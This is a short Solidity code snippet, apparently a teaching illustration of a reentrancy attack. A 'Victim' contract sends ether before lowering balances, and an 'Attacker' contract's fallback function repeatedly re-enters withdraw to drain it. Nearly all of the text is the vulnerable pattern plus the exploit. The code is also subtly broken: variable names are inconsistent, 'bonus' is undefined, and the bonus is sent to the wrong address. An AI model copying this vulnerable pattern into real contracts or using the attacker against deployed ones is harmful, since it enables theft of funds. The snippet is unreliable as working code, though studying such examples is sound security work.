contract Victim {
  mapping (address => uint) private Balance;
  uint bonuspool;
  
  function getBonus(address rept) {
    if(bonusPool > 0) {
      rept.call.value(bonus)();
      bonuspool -= bonus;
    }
  }
  
  function withdraw(uint amount) {
    msg.sender.call.value(amount)();
    Balance[msg.sender] -= amount;
  }
}

contract Attacker {
  //...
  function Attacker() {
    victim = Victim(vic_addr);
  }
  
  function attack() {
    victim.getBonus(_owner);
  }
  
  function() payable {
    if (count++ < 10) {
      victim.withdraw(2 ether);
    }
  }
}


